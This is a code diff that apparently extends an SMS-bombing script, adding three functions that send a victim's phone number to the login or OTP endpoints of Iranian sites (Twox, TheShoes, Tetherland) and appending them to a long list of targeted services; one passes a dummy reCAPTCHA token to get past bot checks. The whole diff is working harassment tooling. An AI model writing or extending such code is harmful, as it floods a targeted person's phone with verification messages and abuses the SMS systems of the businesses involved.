@@ -381,6 +381,41 @@ def ubitex(phone):
         return r.status_code in [200, 400]
     except: return False
 
+
+def twox(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    if not re.match(r"^09\d{9}$", phone): return False
+    try:
+        r = requests.post(f"https://api.twox.ir/api/accounts/signin?username={phone}&otpKind=1", 
+                          json={"token": ""}, headers={"x-agent-source": "web mobile"}, timeout=10)
+        success = r.status_code == 200
+        print(f"[{'+' if success else '-'}] Twox: {r.status_code}")
+        return success
+    except: return False
+
+
+def theshoes(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://theshoes.ir/api/v1/sessions/login_request", 
+                          json={"mobile_phone": phone, "recaptcha_token": "dummy_token"}, 
+                          headers={"Origin": "https://theshoes.ir", "Referer": "https://theshoes.ir/"}, timeout=10)
+        success = r.status_code == 200
+        print(f"[{'+' if success else '-'}] TheShoes: {r.status_code}")
+        return success
+    except: return False
+
+
+
+def tetherland(phone):
+    phone = '0' + phone.split('+98')[-1].split('98')[-1]
+    try:
+        r = requests.post("https://service.tetherland.com/api/v5/login-register", json={"mobile": phone}, timeout=5)
+        success = r.status_code == 200
+        print(f"[{'+' if success else '-'}] Tetherland: {r.status_code}")
+        return success
+    except: return False
+
 # ==========================
 # لیست سرویس‌ها
 # ==========================
@@ -389,7 +424,7 @@ services = [
     arzplus, arzunex, azkivam, azno, basalam,
     bimeh, bimehland, bimeparsian, bornosmode, chapmatin,
     darunet, didar24, digikala, ebimename, ibime,
-    padmira, vakiljo, abantether, ubitex
+    padmira, vakiljo, abantether, ubitex, twox, theshoes, tetherland
 ]
 
 
